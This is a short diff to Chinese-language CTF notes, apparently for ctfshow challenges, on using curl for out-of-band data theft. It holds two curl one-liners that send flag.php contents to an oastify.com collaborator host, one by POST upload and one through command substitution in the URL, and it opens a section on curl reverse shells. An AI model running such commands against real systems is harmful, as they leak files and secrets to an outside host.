@@ -20,6 +20,10 @@ curl -X POST -F xx=@flag.php  http://ie06j1rcl08qz5vd887cz1c9f0ls9ix7.oastify.co
 `@`符号后面跟着的是一个文件路径，`/flag`表示要发送的数据位于当前目录下的`flag`文件中。
 `curl`会读取这个文件的内容，并将其作为POST请求的数据发送到服务器。
 ```
+读flag
+```
+curl oastify.com/`cat flag.php|grep ctfshow`
+```
 
 curl反弹shell
 ```
